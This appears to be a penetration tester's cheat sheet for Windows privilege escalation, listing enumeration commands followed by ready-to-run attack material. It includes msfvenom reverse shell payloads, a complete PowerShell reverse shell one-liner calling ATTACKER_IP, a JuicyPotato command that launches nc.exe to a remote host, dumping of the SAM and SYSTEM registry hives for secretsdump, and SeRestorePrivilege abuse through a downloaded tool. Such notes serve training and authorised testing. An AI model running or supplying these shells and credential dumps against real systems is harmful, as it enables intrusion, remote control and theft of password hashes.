# Windows Privilege Escalation - Cheat Sheet

{% hint style="warning" %}
Check if target si 32 or 64-bit with systeminfo -> System type

Reverse shell for 32bit is:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -a x86 --platform Windows -f exe -o shell.exe
```
{% endhint %}

### 1. System Information

```powershell
systeminfo                      # System info
wmic os get caption,version     # OS version
whoami                          # Current user
whoami /priv                    # Privileges of current user
whoami /groups                  # Group memberships
net users                       # List all users
net user <username>             # User details
net localgroup administrators   # Check admin group members
tasklist /v                     # Running processes
tasklist /svc                   # Processes with services
```

### 2. Searching for Sensitive Files

```powershell
dir /s /b *password* 2>nul       # Find files containing "password"
findstr /si password *.txt       # Search for passwords in text files
dir C:\Users /s /b | findstr /i "password"  # Search for password files in user directories
```

### 3. Permissions and User Privileges

```powershell
net share                       # Shared folders
net user <user>                 # User details
icacls C:\path\to\file        # Check file permissions
```

### 4. Scheduled Tasks & Services

```powershell
schtasks /query /fo LIST /v     # List scheduled tasks
Get-ScheduledTask | fl          # PowerShell alternative
sc query                        # List services
sc qc <service>                 # Check service config
```

### 5. Network & Firewall

```powershell
ipconfig /all                   # Network configuration
netstat -ano                    # Open network connections
route print                      # Routing table
Get-NetFirewallRule              # Firewall rules (PowerShell)
```

### 6. Logs & Event Viewer

```powershell
wevtutil qe Security /c:10 /f:text /rd:true  # Last 10 security logs
Get-EventLog -LogName Security -Newest 10   # PowerShell alternative
```

### 7. Common Service Paths & Registry Keys

```powershell
C:\ProgramData\
C:\Users\Public\
C:\Windows\System32\Tasks\
C:\Windows\System32\config\
C:\Windows\System32\drivers\etc\
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
```

### 8. Reverse Shells

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

#SeImpersonatePrivilege -> 32bit
juicypotato32.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\Temp\nc.exe -e cmd.exe <IP> <PORT>" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

### 9. Exploitation & Enumeration Tools

reverse shell ->

```
msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.45.207 -f exe -o shell.exe
```

winpeas ->

```powershell
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250301-c97fb02a/winPEASany.exe -OutFile winPEASany.exe
.\winPEASany.exe  # Run WinPEAS
```

### 10. PRIVILEGES Exploitation, quick and easy

<details>

<summary>SeBackupPrivilege</summary>

Let's say we got some sort of evil winrm session on our target:

```
mkdir C:\Temp
cd C:\Temp
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
download "C:/Temp/system.hive"
download "C:/Temp/sam.hive"
```

and on our attackbox:

```
secretsdump -sam sam.hive -system system.hive LOCAL
```

</details>

<details>

<summary>SeRestorePrivilege</summary>

We start off by making a malicious exe:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR tun0 IP> LPORT=80 -f exe -o reverse.exe
```

Then we downlaod SeRestoreAbuse.exe:

```
https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe?source=post_page-----158516460860---------------------------------------
```

after we set up our listener:

```
rlwrap nc -nlvp 80
```

and launch our command:

```
.\SeRestoreAbuse.exe reverse.exe
```

</details>

